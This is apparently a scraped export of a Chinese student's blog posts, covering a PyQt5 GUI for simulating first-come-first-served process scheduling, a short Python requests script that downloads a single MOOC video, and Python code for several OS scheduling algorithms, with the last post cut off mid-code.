\u0026#39;到达时间\u0026#39;, \u0026#39;服务时间\u0026#39;, \u0026#39;静态优先级\u0026#39;] # 设置每列标题 self.table.setHorizontalHeaderLabels(self.headers) # 导入 self.table.verticalHeader().setVisible(False) # 隐藏垂直表头 self.show() # 添加行 def add_line(self): self.table.cellChanged.disconnect() row = self.table.rowCount() # 获取目前所有行的数量 self.table.setRowCount(row + 1) id = str(self.id) # 生成复选框， 并设置居中显示 ck = QCheckBox() h = QHBoxLayout() h.setAlignment(Qt.AlignCenter) h.addWidget(ck) w = QWidget() w.setLayout(h) # 变量由faker自动生成 name = self.faker.name() arr_time = str(random.randint(0,9)) ser_time = str(random.randint(0,9)) sta_class = str(random.randint(0,9)) # 设置新建行的数据 self.table.setItem(row,0,QTableWidgetItem(id)) self.table.setCellWidget(row,1,w) self.table.setItem(row,2,QTableWidgetItem(name)) self.table.setItem(row,3,QTableWidgetItem(arr_time)) self.table.setItem(row,4,QTableWidgetItem(ser_time)) self.table.setItem(row,5,QTableWidgetItem(sta_class)) self.id += 1 # 设置完不要忘记id加一 self.lines.append([id,ck,name,arr_time,ser_time,sta_class]) self.settext(\u0026#39;自动生成随机一行数据！,checkbox设置为居中显示\u0026#39;) self.table.cellChanged.connect(self.cellchange) # 删除行 def del_line(self): removeline = [] for line in self.lines: if line[1].isChecked(): row = self.table.rowCount() for x in range(row,0,-1): if line[0] == self.table.item(x - 1,0).text(): self.table.removeRow(x - 1) removeline.append(line) for line in removeline: self.lines.remove(line) self.settext(\u0026#39;删除checkbox中选中状态的行\u0026#39;) def modify_line(self): if self.editable == True: self.table.setEditTriggers(QAbstractItemView.NoEditTriggers) self.btn_modify.setText(\u0026#39;禁止编辑\u0026#39;) self.editable = False else: self.table.setEditTriggers(QAbstractItemView.AllEditTriggers) self.btn_modify.setText(\u0026#39;可以编辑\u0026#39;) self.editable = True self.settext(\u0026#39;设置是否可以编辑表格信息\u0026#39;) def middle(self): row = self.table.rowCount() for x in range(row): for y in range(6): if y != 1: item = self.table.item(x,y) item.setTextAlignment(Qt.AlignCenter) else: pass self.settext(\u0026#39;将文字居中显示\u0026#39;) def cellchange(self,row,col): item = self.table.item(row,col) txt = item.text() self.settext(\u0026#39;第%s行，第%s列 , 数据改变为:%s\u0026#39;%(row,col,txt)) def g_info(self): # 我们每次使用这个功能时先把全变量原始进程列表 -- original_processes --清空好吧 original_processes = [] row = self.table.rowCount() for j in range(row): # 有几行就有几个进程 na = self.table.item(j,2).text() at = int(self.table.item(j,3).text()) st = int(self.table.item(j,4).text()) sc = int(self.table.item(j,5).text()) p = Process(na, at, st, sc) original_processes.append(p) print(na+\u0026#39; \u0026#39;+str(at)+\u0026#39; \u0026#39;+str(st)+\u0026#39; \u0026#39;+str(sc)) \u0026#39;\u0026#39;\u0026#39; 由于第一个进程不一定就是到达时间最短的进程，所以我们先按照 到达时间给进程排个序 \u0026#39;\u0026#39;\u0026#39; _sorted_processes = original_processes[:] _sorted_processes.sort(key=operator.attrgetter(\u0026#39;arrive_time\u0026#39;)) infor_list = fcfs(_sorted_processes) self.avrtime_edit.setText(str(infor_list[1])) self.over_Edit.setText(str(infor_list[0])) self.settext(\u0026#39;获取表格信息，生成调度序列，计算平均、平均带权周转时间，并显示\u0026#39;) def settext(self,txt): font = QFont(\u0026#39;微软雅黑\u0026#39;,10) self.txt.setFont(font) self.txt.setText(txt) if __name__ == \u0026#39;__main__\u0026#39;: app = QApplication(sys.argv) ui = ui() sys.exit(app.exec_()) 大体思路 数据结构定义及功能算法部分 # 引入数据结构 # 定义每个进程基本数据结构 class Process: def __init__(self, name, arrive_time, serve_time, static_class, ready=False, over=False): self.name = name # 进程名称 self.arrive_time = arrive_time # 到达时间 self.serve_time = serve_time # 服务时间 self.left_serve_time = serve_time # 剩余需要服务的时间 self.finish_time = 0 # 完成时间 self.cycling_time = 0 # 周转时间 self.w_cycling_time = 0 # 带权周转时间 self.response_ratio = 0 # 响应比 self.pre_queue = 0 # 定义现在所在的队列 self.pre_queue_tb = 0 # 目前所在队列的时间片 self.used_time = 0 # 已经使用的时间，也就是（服务时间 - 剩余服务时间） self.ready = ready # 记录就绪状态 self.over = over # 记录完成状态 self.static_class = static_class # 人为赋予静态优先级 # 现来先服务作业调度算法 def fcfs(processes): # 到达时间小的优先 sum_cycling_time = 0 sum_w_cycling_time = 0 number = len(processes) over_list = [] min_key = 0 fin_name = [] name_string = \u0026#39;\u0026#39; time_string = \u0026#39;带权周转时间：\u0026#39; last_infor = [] running_time = 0 while processes: min = processes[0].arrive_time for i in range(len(processes)): if processes[i].arrive_time \u0026lt;= min: min = processes[i].arrive_time min_key = i running_time += processes[min_key].serve_time processes[min_key].cycling_time = running_time - processes[min_key].arrive_time processes[min_key].w_cycling_time = processes[min_key].cycling_time / processes[min_key].serve_time sum_cycling_time += processes[min_key].cycling_time sum_w_cycling_time += processes[min_key].w_cycling_time over_list.append(processes.pop(min_key)) for i in range(len(over_list)): print(over_list[i].name) name_string += (over_list[i].name+\u0026#39; \u0026#39;) fin_name.append(over_list[i].name) a_c_time = sum_cycling_time/number a_w_c_time = sum_w_cycling_time/number print(\u0026#39;平均周转时间：\u0026#39; + str(a_c_time)) print(\u0026#39;平均带权周转时间：\u0026#39; + str(a_w_c_time/number)) time_string += (str(a_c_time) + \u0026#39; 平均带权周转时间：\u0026#39; + str(a_w_c_time)) last_infor.append(name_string) last_infor.append(time_string) # return fin_name return last_infor 这部分内容在之前的博客中有大体的讲，不过好像是重构了，过段时间应该还要重构。\n这里要注意返回的列表有两项，分别是调度完之后的作业or进程名称顺序字符串，还有平均周转时间和平均带权周转时间的时间参数字符串。就不多讲了。\n在每次执行完一个作业or进程之后，会进行一个周转时间和带权周转时间的计算，方便计算性能。\n其余和之前差不多。\nGUI部分 引入的库和模块\nfrom PyQt5.QtWidgets import (QWidget,QLineEdit,QHBoxLayout,QTableWidget,QPushButton,QApplication,QVBoxLayout,QTableWidgetItem,QCheckBox,QAbstractItemView,QHeaderView,QLabel,QFrame) from PyQt5 import QtWidgets, QtCore from PyQt5.QtCore import Qt from builtins import super, str, range from PyQt5.QtGui import QFont,QColor from faker import Factory import random, sys, operator 主要用了是PyQt5的模块，另外加一些内置的计算模块，像后面的算法还用到numpy等科学计算模块\n语法、思路、排版、实现\n直接往代码里写了啊\nclass ui(QWidget): # 继承QWidget def __init__(self): super(ui, self).__init__() self.setupUI() self.id = 1 self.lines = [] self.editable = True self.des_sort = True self.faker = Factory.create()\t# faker库是数据伪造生成器，后续会搬运一篇博文讲 \u0026#39;\u0026#39;\u0026#39; 这里面主要使用了 按钮-button 标签-lable 编辑单行文本框-editline 表格-table 这几个控件 我觉得难点主要在于不熟悉这些控件的方法，英语又不好官方文档看明白是不可能的...对了6级第一次裸考没过 \u0026#39;\u0026#39;\u0026#39; # 按钮绑定事件 \u0026#39;\u0026#39;\u0026#39; 主要事件 add_line 表格添加行 del_line 表格删除行 modify_line 控制表格是否可以被编辑 middle 设置表格文字居中显示 cellchange 根据相关触发的操作提示你的操作是干嘛的 \u0026#39;\u0026#39;\u0026#39; self.btn_add.clicked.connect(self.add_line) self.btn_del.clicked.connect(self.del_line) self.btn_modify.clicked.connect(self.modify_line) self.btn_set_middle.clicked.connect(self.middle) self.btn_get_info.clicked.connect(self.g_info) self.table.cellChanged.connect(self.cellchange) global original_processes # 这里我们定义全局变量 - 原始进程列表，是一个二维列表 def setupUI(self): # 控件的排版，做的时候嵌套布局那一块觉得自己是真的学到了，很有趣，基本设置Google Baidu都可找到 self.setWindowTitle(\u0026#39;数据测试\u0026#39;) self.resize(720,420) self.table = QTableWidget(self) self.btn_add = QPushButton(\u0026#39;增加\u0026#39;) self.btn_del = QPushButton(\u0026#39;删除\u0026#39;) self.btn_modify = QPushButton(\u0026#39;可以编辑\u0026#39;) self.btn_set_middle = QPushButton(\u0026#39;文字居中\u0026#39;) self.btn_get_info = QPushButton(\u0026#39;生成调度序列\u0026#39;) # 弹簧控件，这个不是很明白 self.spacerItem = QtWidgets.QSpacerItem(20, 20, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding) # 垂直布局，使用嵌套布局方式 # 我们把所有按钮按照盒布局-垂直布局方式，构成嵌套布局的一个块 # 按照设置的方式依此从上到下 self.vbox = QVBoxLayout() self.vbox.addWidget(self.btn_add) self.vbox.addWidget(self.btn_del) self.vbox.addWidget(self.btn_modify) self.vbox.addWidget(self.btn_set_middle) self.vbox.addWidget(self.btn_get_info) self.vbox.addSpacerItem(self.spacerItem) self.txt = QLabel() # 这是进行操作时显示在最左下角的提示信息 self.txt.setMinimumHeight(50) # 限定控件大小 self.lab_over = QLabel(\u0026#39;调度顺序\u0026#39;) # 输出队列顺序 self.lab_over.setMinimumHeight(20) self.over_Edit = QLineEdit(self) self.over_Edit.setMinimumHeight(25) self.lab_time = QLabel(\u0026#39;平均周转时间和平均带权周转时间\u0026#39;) self.avrtime_edit = QLineEdit(self) # 垂直布局 # 把表格和下面的操作提示文本信息按照垂直布局设置，作为嵌套布局方式的另一部分 self.vbox2 = QVBoxLayout() self.vbox2.addWidget(self.table) # 将表格和下面的操作提示放入垂直布局，先放表格 self.vbox2.addWidget(self.lab_over) # 放输出队列 self.vbox2.addWidget(self.over_Edit) self.vbox2.addWidget(self.lab_time) self.vbox2.addWidget(self.avrtime_edit) self.vbox2.addWidget(self.txt) # 再放文本框 # 水平布局 # 这是将上述两个布局方式作为整体布局的元素，vbox和vbox2共同放入水平布局 self.hbox = QHBoxLayout() self.hbox.addLayout(self.vbox2) # 将这样就会自左向右，先放表格， self.hbox.addLayout(self.vbox) # 再放按钮 # 将水平布局放入总体布局 self.setLayout(self.hbox) # 表格基本属性设置 self.table.setColumnCount(6) # 设置列数 self.table.horizontalHeader().setDefaultAlignment(QtCore.Qt.AlignCenter) self.headers = [\u0026#39;ID\u0026#39;,\u0026#39;选择\u0026#39;,\u0026#39;进程名\u0026#39;, \u0026#39;到达时间\u0026#39;, \u0026#39;服务时间\u0026#39;, \u0026#39;静态优先级\u0026#39;] # 设置每列标题 self.table.setHorizontalHeaderLabels(self.headers) # 导入 self.table.verticalHeader().setVisible(False) # 隐藏垂直表头 self.show() # 添加行 def add_line(self): self.table.cellChanged.disconnect() row = self.table.rowCount() # 获取目前所有行的数量 self.table.setRowCount(row + 1) id = str(self.id) # 生成复选框， 并设置居中显示 ck = QCheckBox() h = QHBoxLayout() h.setAlignment(Qt.AlignCenter) h.addWidget(ck) w = QWidget() w.setLayout(h) # 变量由faker自动生成 name = self.faker.name() arr_time = str(random.randint(0,9)) ser_time = str(random.randint(0,9)) sta_class = str(random.randint(0,9)) # 设置新建行的数据 self.table.setItem(row,0,QTableWidgetItem(id)) self.table.setCellWidget(row,1,w) self.table.setItem(row,2,QTableWidgetItem(name)) self.table.setItem(row,3,QTableWidgetItem(arr_time)) self.table.setItem(row,4,QTableWidgetItem(ser_time)) self.table.setItem(row,5,QTableWidgetItem(sta_class)) self.id += 1 # 设置完不要忘记id加一 self.lines.append([id,ck,name,arr_time,ser_time,sta_class]) self.settext(\u0026#39;自动生成随机一行数据！,checkbox设置为居中显示\u0026#39;) self.table.cellChanged.connect(self.cellchange) # 删除行 def del_line(self): removeline = [] for line in self.lines: if line[1].isChecked(): row = self.table.rowCount() for x in range(row,0,-1): if line[0] == self.table.item(x - 1,0).text(): self.table.removeRow(x - 1) removeline.append(line) for line in removeline: self.lines.remove(line) self.settext(\u0026#39;删除checkbox中选中状态的行\u0026#39;) def modify_line(self): if self.editable == True: self.table.setEditTriggers(QAbstractItemView.NoEditTriggers) self.btn_modify.setText(\u0026#39;禁止编辑\u0026#39;) self.editable = False else: self.table.setEditTriggers(QAbstractItemView.AllEditTriggers) self.btn_modify.setText(\u0026#39;可以编辑\u0026#39;) self.editable = True self.settext(\u0026#39;设置是否可以编辑表格信息\u0026#39;) def middle(self): row = self.table.rowCount() for x in range(row): for y in range(6): if y != 1: item = self.table.item(x,y) item.setTextAlignment(Qt.AlignCenter) else: pass self.settext(\u0026#39;将文字居中显示\u0026#39;) def cellchange(self,row,col): item = self.table.item(row,col) txt = item.text() self.settext(\u0026#39;第%s行，第%s列 , 数据改变为:%s\u0026#39;%(row,col,txt)) def g_info(self): # 我们每次使用这个功能时先把全变量原始进程列表 -- original_processes --清空好吧 # 这个函数获取表格数据存入队列，初始化进程信息加入列表，最后调主算法函数进行模拟调度，最后返回信息 original_processes = [] row = self.table.rowCount() for j in range(row): # 有几行就有几个进程 na = self.table.item(j,2).text() at = int(self.table.item(j,3).text()) st = int(self.table.item(j,4).text()) sc = int(self.table.item(j,5).text()) p = Process(na, at, st, sc) original_processes.append(p) print(na+\u0026#39; \u0026#39;+str(at)+\u0026#39; \u0026#39;+str(st)+\u0026#39; \u0026#39;+str(sc)) \u0026#39;\u0026#39;\u0026#39; 由于第一个进程不一定就是到达时间最短的进程，所以我们先按照 到达时间给进程排个序 这是后来才想到的，还有很多诸如此类的bug...脑壳疼 \u0026#39;\u0026#39;\u0026#39; _sorted_processes = original_processes[:] _sorted_processes.sort(key=operator.attrgetter(\u0026#39;arrive_time\u0026#39;)) infor_list = fcfs(_sorted_processes) # 讲返回的信息填入文本框 self.avrtime_edit.setText(str(infor_list[1])) self.over_Edit.setText(str(infor_list[0])) self.settext(\u0026#39;获取表格信息，生成调度序列，计算平均、平均带权周转时间，并显示\u0026#39;) # 提示字体的设置 def settext(self,txt): font = QFont(\u0026#39;微软雅黑\u0026#39;,10) self.txt.setFont(font) self.txt.setText(txt) 最后就\u0026hellip;\nif __name__ == \u0026#39;__main__\u0026#39;: app = QApplication(sys.argv) ui = ui() sys.exit(app.exec_()) 大体框架写完之后觉得好多东西并没有那么难，只是你没有见过所以觉得很唬人，然而我觉得我coding效率还是太低了，诶\n演示 主页面\n添加行并自动生成数据\n更改数据\n居中对齐\n生成序列并显示调度顺序和时间效率\n删除选中行\n完事了就，太简陋···但是一想这东西用c/c++写就也太麻烦了吧，python真好~\n不足与改进思路 不足 算法有问题，数据容错率极低，经常因为数据不规范就原地崩 没有实现 作业/进程 数据可从外部导入的功能 没实现 单步执行 的功能，我想这是最要紧的\u0026hellip; 没有 相同进程不同算法性能数据比较 功能 不够集成 总体看来，就是只实现了一个大体的demo，还有很多需要改进\n改进思路 算法重构，昨天调的时候觉得太乱了，而且如果要单步执行的话目前算法应该不能达到要求 优化GUI 还是算法吧，数据容错性太差 添加从外部文件导入数据功能 题外话：最近有些焦虑，铺天盖地的说2019计算机考研哪哪都炸，初试神仙打架复试百里挑一，985211各路神仙跨考计算机的数不过来，感觉350都不叫分了。就一股脑都来吃计算机这碗饭，就连调剂的生源都不错，更何况一堆搞ACM的、手里拿着一大堆项目、顶级论文发了好几篇的神仙也\u0026hellip;越来越觉得路难走，实力又真是差十万八千里，就越发急于求成，想很快可以出成绩看到结果。输在了起跑线上在后面得付出更多的努力，然而更多时候只是停留嘴面实际行动又不及十分之一。可能就不具备那种潜质再者说没有足够的动力一直激励自己。但，但行好事莫问前程吧。今天20了\u0026hellip;真快，可以再加把劲\n写的太晚了难免有纰漏，望海涵\n源码地址\n","date":"2019-03-12T22:59:15+08:00","permalink":"https://lizonglingo.github.io/p/%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A21.0/","title":"处理机调度图形界面1.0"},{"content":" 最近有跟进学习爬虫的知识，教材是《Python网络数据采集》（Ryan Mitchell）,之后配合《利用Python进行数据分析》（Wes McKinney）进一步学习，我想学习路线也不会很长或者说很陡峭。昨天在B站找了北理工的爬虫慕课，我觉得这个课程对于初学者非常友好，今天就copy一个小玩意纯当入门。\n先上代码 # 这是一个未封装的示例，需要的话可以封装成函数接口，或者做一下用户界面用Pyinstaller做个小工具。 # 我觉得可以，但是没必要哈 import requests import os url = \u0026#34;https://jdvodrvfb210d.vod.126.net/mooc-video/nos/mp4/2016/06/19/1004550079_f7311774e53d4771b7069623b4728b97_hd.mp4\u0026#34; root = \u0026#34;D://pics//\u0026#34; path = root + url.split(\u0026#39;/\u0026#39;)[-1] try: if not os.path.exists(root): os.mkdir(root) if not os.path.exists(path): r = requests.get(url) with open(path, \u0026#39;wb\u0026#39;) as f: f.write(r.content) f.close() print(\u0026#34;文件保存成功\u0026#34;) else: print(\u0026#34;文件已存在\u0026#34;) except: print(\u0026#34;爬取失败\u0026#34;) 详解 B站上有好多up主有搬运的mooc的视频，我想很多油猴插件也是用类似的方法将网站上的视频搬运到更方便的地方的。\n今天爬取中国大学mooc上的一个视频，外加LonelyPlanet（孤独星球是我高中时非常喜欢的杂志）一张图片作为示例。\n# 引入的包 import requests import os requests 是一个python自带的库，适用于小型（mini可以）爬虫\n我们用os库的方法创建文件夹和存放下载的文件\nurl = \u0026#34;https://jdvodrvfb210d.vod.126.net/mooc-video/nos/mp4/2016/06/19/1004550079_f7311774e53d4771b7069623b4728b97_hd.mp4\u0026#34; root = \u0026#34;D://pics//\u0026#34; path = root + url.split(\u0026#39;/\u0026#39;)[-1] url 存放我们所爬取信息的url链接，一般来说，图片文件是以“ .jpg ” 结尾的，而视频文件是以 “ .mp4 ”结尾的。（当然不止这两种，一般是图片或者视频常用的后缀比如：png mkv等等等）\nroot 存放的是下载后文件的存放路径，代码是以 D 盘的 pics 文件夹作为根目录。\npath 是具体文件的存放路径，split 这个方法是将字符串以 \u0026ldquo;/\u0026rdquo; 为分隔，生成列表，取最后一项，举个栗子：\nurl = \u0026#34;https://123/456/goodnight.jpg\u0026#34; root = \u0026#34;D://pics//\u0026#34; path = root + url.split(\u0026#39;/\u0026#39;)[-1] # 这样的话， path = D:/pics/goodnight.jpg # 打开D盘的pics文件夹就能看到goodnight.jpg这个文件了 try: if not os.path.exists(root):\t# 如果没有这个根目录 os.mkdir(root) if not os.path.exists(path):\t# 如果没有这个文件，我们就可以下载，不会产生异常 r = requests.get(url) with open(path, \u0026#39;wb\u0026#39;) as f:\t# 基本的文件操作 f.write(r.content) f.close() print(\u0026#34;文件保存成功\u0026#34;) else: print(\u0026#34;文件已存在\u0026#34;) except: print(\u0026#34;爬取失败\u0026#34;) try _ except 块是最基础的框架，可套用。\n开动 首先是mooc的小视频\n我就用这个吧（袁春风老师讲的计组确实不错~），那么怎么找到视频的url链接呢，我们右键视频\n在显示统计信息里，我们看到了url 相关的字样，这是有效信息，将它搞下来（Chrome浏览器提供开发者工具应该也可以的）\n尽可能多的将全部url信息复制下来，ctrl C V好像没用，直接拖出来吧\n然后提取有用信息\n我们只需要 http ~ mp4 之间的，也就是\n好了，放到 url 里面\nurl = \u0026#34;https://jdvodrvfb210d.vod.126.net/mooc-video/nos/mp4/2016/06/19/1004550079_f7311774e53d4771b7069623b4728b97_hd.mp4\u0026#34; 运行，如果没出现异常，下载文件是需要等一会的o\n感人网速下了一分多钟，差点以为挂掉了\n然后打开D盘发现生成pics文件夹并且下载好了\nwin10截屏快捷键是 win + shift + s，自动保存在剪切板，直接ctrl v用就行了\n图片的也是一样，理论上只要能得到url链接就可以。\n","date":"2019-03-04T22:11:11+08:00","permalink":"https://lizonglingo.github.io/p/%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%88%AC%E5%8F%96%E5%8D%95%E4%B8%AA%E5%9B%BE%E7%89%87%E6%88%96%E8%80%85%E8%A7%86%E9%A2%91/","title":"用20行代码爬取单个图片或者视频"},{"content":" 拖拖拉拉，昨天终于写完核心算法，UI界面几乎没写，估计开学会被导师mao一顿。说一下python GUI大家最好不要去动TK，前些日子找官方文档查方法体验非常差，而且网上的教程写的乱七八糟。有兴趣的话大家可以学习PyQt，这是一个跨平台的GUI，除了python，好多语言都有自己的版本，可以移植性比较高。重要的是有前辈翻译的官方文档，也会一直更新，后期会如果有时间会放上链接及相关教程。\n这一篇是关于如何用python语言模拟常见的处理机调度，我这么菜是当然不会有UI界面的···\nPython模拟操作系统处理机调度 算法概览 FCFS 现来先服务调度算法 SCF 这个是我起的英文名··· 其实就是 static class first 静态优先权优先调度算法 SJF 短作业优先 SRTF 最短剩余时间优先 HRRN 最高响应比优先 RR 轮转法 MFQ 多级反馈队列调度算法 一共以上七种常见调度算法，其中既包括作业调度，也包括进程调度。\n作业调度：FCFS SJF SCF SRTF HRRN 进程调度：RR MFQ 其中又分为抢占式和非抢占式，这里就不详细说了。\n核心算法 定义进程数据结构 为了统一所有算法使用的数据类型，我们有必要统一进程的属性，结构\nclass Process: def __init__(self, name, arrive_time, serve_time, static_class=0, ready = False, over=False): self.name = name # 进程名 self.arrive_time = arrive_time # 到达时间 self.serve_time = serve_time # 需要服务的时间 self.left_serve_time = serve_time # 剩余需要服务的时间 self.finish_time = 0 # 完成时间 self.cycling_time = 0 # 周转时间 self.w_cycling_time = 0 # 带权周转时间 self.static_class = static_class # 静态优先级 self.response_ratio = 0 # 响应比 self.pre_queue = 0 # 定义现在所在的队列 self.pre_queue_tb = 0 # 目前所在的队列（多级反馈队列使用） self.used_time = 0 # 进程已经进行了多少时间 self.ready = ready # 进程是否就绪 self.over = over # 进程是否进行完成 FCFS 先来先服务 顾名思义，先到达的作业先处理\nclass FCFS: def __init__(self, processes_): self.processes = processes_ def fcfs(self): # 到达时间小的优先 processes = self.processes # 新建输出队列 over_list = [] min_key = 0 while processes: for i in range(len(processes)): min = processes[0].arrive_time if processes[i].arrive_time \u0026lt;= min: min = processes[i].arrive_time min_key = i over_list.append(processes.pop(min_key)) for i in range(len(over_list)): print(over_list[i].name) 当初始队列不为空时，进行循环，比较所有作业的到达时间，每次循环把到达时间最小的作业出队列，并入输出队列over_list，最后输出队列的顺序就是处理作业的顺序。\nSCF 静态优先权优先调度算法 这里我们假设静态优先级是人为赋予的，在生成的作业说明书里就有，所以算法思想和现来先服务是一样的，在已经到达的作业队列中选取优先级最高的作业进行调度。\n天哪改完了，因为刚才我在写的时候突然想到我写错了，我犯的错误是在进行优先级比较时，没有分哪些是已经到达的作业哪些是还未到达的作业。\nclass SJF: def __init__(self, processes_): self.processes = processes_ def sjf(self): # 静态优先级高的优先，人为赋予 processes = self.processes pre_processes = [] # 就绪队列 over_processes = [] # 输出队列 pre_processes.append(processes[0]) number = len(processes) flag = 0 # 记录作业完成数量 max_key = 0 running_time = 0 while flag != number: # 所有作业都完成时结束循环 max_key = 0 # 优先级最高进程的下标 max = pre_processes[0].static_class # 最高优先级 for k in range(len(pre_processes)): # 在当前就绪队列中选出优先级最高的作业 if pre_processes[k].static_class \u0026gt; max: max = pre_processes[k].static_class max_key = k for j in range(pre_processes[max_key].serve_time): # 在当前所要处理的作业的服务时间里 pre_processes[max_key].left_serve_time -= 1 running_time += 1 if pre_processes[max_key].left_serve_time == 0: # 剩余服务时间为零，弹出进入完成队列 flag += 1 over_processes.append(pre_processes.pop(max_key)) for i in range(number): # 每一时刻是否有到达作业将其入队 if processes[i].arrive_time == running_time: pre_processes.append(processes[i]) for i in range(len(over_processes)): # 按照作业完成顺序输出 print(over_processes[i].name) SJF 短作业优先 短作业优先调度算法思想和静态优先权优先的思想一样，只是选取就绪进程中，所需要的服务时间最小的作业优先调度。\nclass SJF: def __init__(self, processes_): self.processes = processes_ def sjf(self): processes = self.processes flag = 0 # 记录已完成的进程数量 time = 0 # 模拟时钟技术 current_process = -1 # 记录当前正在执行的进程下标 while(flag!=5): if current_process != -1: # 此时有进程在执行 processes[current_process].used_time += 1 if processes[current_process].used_time == processes[current_process].handle_time: print(\u0026#39;进程\u0026#39; + processes[current_process].name + \u0026#39;处理完毕！\u0026#39;) flag += 1 processes[current_process].over = True # current_process = -1 for i in range(len(processes)): if time == processes[i].arrive_time: processes[i].ready = True min_handle = 100 for i in range(len(processes)): if processes[i].ready == True and processes[i].over == False: # 表示进程到达且未被处理完，用了ready和over两属性，而没有使用就绪队列和完成队列来标识 if current_process == -1: min_handle = processes[0].handle_time current_process = 0 else: if processes[current_process].over == True: for i in range(len(processes)): if processes[i].ready == True and processes[i].over == False: if processes[i].handle_time \u0026lt;= min_handle: current_process = i min_handle = processes[i].handle_time time += 1 SRTF 最短剩余时间优先 其实前面大家可能注意到了，每个算法都有一个模拟时钟计数，每次time+=1就是过了一秒钟，即在第几秒那一时刻发生的动作。在这个算法中，我们不仅要注意每一秒执行哪一个作业，还要注意每一秒哪一个作业到达，更要计算每一秒，到达的作业中哪一个需要的服务时间剩的最短。所以每一秒钟执行的作业都可能不一样。\nimport copy # 使用了copy，体验一下··· class SRTF: def __init__(self, processes_): self.processes = processes_ def srtf(self): processes = self.processes flag = 0 # 记录已经处理完成的作业 time = 0 # 模拟时间计数器 current_process = -1 # 记录当前作业的下标，如果为-1表示当前没有作业在执行 # 主循环，已经操作完成的作业数等于所有作业时结束循环 while(flag != len(processes)): if current_process != -1: # 表示有作业正在执行 processes[current_process].left_serve_time -= 1 if processes[current_process].left_serve_time == 0: print(\u0026#39;进程\u0026#39; + processes[current_process].name + \u0026#39;处理完毕！\u0026#39;) flag += 1 processes[current_process].over = True current_process = -1 # 需要重置为-1 # 判断此时刻是否有新的作业进入就绪队列等待处理 for i in range(len(processes)): if time == processes[i].arrive_time: processes[i].ready = True # 寻找剩余时间最少的作业并进行调度 min_time_remain = 100 # 假设所有作业的剩余时间都不会超过100 for i in range(len(processes)): if processes[i].ready == True and processes[i].over == False: if (processes[i].left_serve_time) \u0026lt; min_time_remain: min_time_remain = processes[i].left_serve_time current_process = i # 将剩余时间最短的作业置为当前作业 time += 1 # 每次循环完time加一 这样总结下来，我们发现，每秒操作就是那几个：确定当前执行作业；执行作业，判断是否完成；判断此时是否有新作业到达；时钟加一。而循环结束的条件一般都是计数 == 所有进程数。\nHRRN 最高响应比优先 这个就是每当一个作业处理完或者发生阻塞时，计算各个就绪作业的响应比，选取最高的作为当前处理作业。也就是说，作业一旦开始执行，就不会因为响应比的改变而停止，只有一个作业完成时才重新计算就绪作业的响应比。\nclass HRRN: def __init__(self, processes): self.sum_processes = processes def hrrn(self): pre_processes = [] over_processes = [] running_time = 0 flag = 0 pre_processes.append(self.sum_processes[0]) while(flag!=len(self.sum_processes)): # 计算响应比 for j in range(len(pre_processes)): pre_processes[j].response_ratio = (running_time - pre_processes[j].arrive_time + \\ pre_processes[j].serve_time) / pre_processes[j].serve_time # 找到响应比最大的进程 max_rr = 0 for i in range(len(pre_processes)): if pre_processes[i].response_ratio \u0026gt;= pre_processes[max_rr].response_ratio: max_rr = i for i in range(pre_processes[max_rr].serve_time): running_time += 1 # 时钟加一 for k in range(len(self.sum_processes)): # 就绪队列入队 if self.sum_processes[k].arrive_time == running_time: pre_processes.append(self.sum_processes[k]) over_processes.append(pre_processes.pop(max_rr)) flag += 1 for i in range(len(over_processes)): print(over_processes[i].name) RR 轮转法调度 在轮转法和接下来的多级反馈队列调度中，都会有时间片。也就是说，时间以时间片为大单位执行，每个时间片内，如果当前进程执行完毕输出即可，反之则放到队列最后，等待下一次执行。注意时间小单位依然是1，因为在每一秒内，我们还要知道有哪些进行到达就绪。\nclass RR: def __init__(self, processes, time_block, running_time = 0): self.processes = processes self.time_block = time_block self.running_time = running_time def rr(self): pre_processes = [] # running_time等于进程到达时间时会将其入队 over_processes = [] # 完成队列 flag = 0 # 记录完成的进程数 running_time = self.running_time time_block = self.time_block pre_processes.append(self.processes[0]) # 先将第一个进程入队 while(flag != len(self.processes)): # 是否进程入队的优先级高于进程从队首切换到队尾的优先级？ # 执行当前队首进程，如果一个时间片内不能执行完，则放入队列尾部 # 判断时间片是否大于剩余服务时间 if time_block \u0026gt;= pre_processes[0].left_serve_time: for i in range(pre_processes[0].left_serve_time): pre_processes[0].left_serve_time -= 1 running_time += 1 for i in range(len(self.processes)): if running_time == self.processes[i].arrive_time: pre_processes.append(self.processes[i]) # 就绪队列进入队尾 if pre_processes[0].left_serve_time == 0: # 计算完成时间 pre_processes[0].finish_time = running_time # 计算周转时间 pre_processes[0].cycling_time = pre_processes[0].finish_time \\ - pre_processes[0].arrive_time # 计算带权周转时间 pre_processes[0].w_cycling_time = float(pre_processes[0].cycling_time) / pre_processes[0].serve_time # 打印 print(\u0026#39;%s 进程已完成的进程，详细信息如下：\u0026#39; % pre_processes[0].name) print(\u0026#39;进程名称：%s ，完成时间： %d ，周转时间：%d ，带权周转时间： %.2f\u0026#39; % ( pre_processes[0].name, pre_processes[0].finish_time, pre_processes[0].cycling_time,pre_processes[0].w_cycling_time)) flag += 1 over_processes.append(pre_processes.pop(0)) # 进程结束从就绪队列出队进完成队列 continue # 直接结束此次循环，下面内容不执行 else: # 剩余服务时间大于一个时间片 for i in range(time_block): pre_processes[0].left_serve_time -= 1 running_time += 1 for i in range(len(self.processes)): # 判断此时有没有就绪队列加入队尾 if running_time == self.processes[i].arrive_time: pre_processes.append(self.processes[i]) # 一个时间片结束进程从队头切换至队尾 pre_processes.append(pre_processes.pop(0)) MFQ 多级反馈队列调度算法 这里我们假设的是有三级队列，时间片分别为1，2，4 。当然，可以不是这样，只需要在代码里做出一些修改，这样只是为了测试方便。\n在多级反馈队列中，对最后一个队列要使用轮转法进行调度，因此我们重写轮转法使之更符合MFQ的需求。注意的是，有bug：如果此时只有第三级队列有进程，某时刻突然有新进程加入队列，那么将不会处理。简单说就是开始处理最后一个队列的时候，不再受理新进入的进程，也就是在处理完一级二级队列的过程中，必须将保证所有进程都已就绪。后序如果有时间会进行改进。\nclass MFQ: def __init__(self, processes, class_time_block): self.processes = processes # 这是就绪以及未就绪的所有队列 self.class_time_block = class_time_block # 时间递增量级 def mfq(self): sum_processes = self.processes # 我们这里使用三队列，将到达的队列放入 f_processes = [] s_processes = [] t_processes = [] # 规定每个队列的时间片，这里我们直接计算 f_time_block = 1 s_time_block = 2 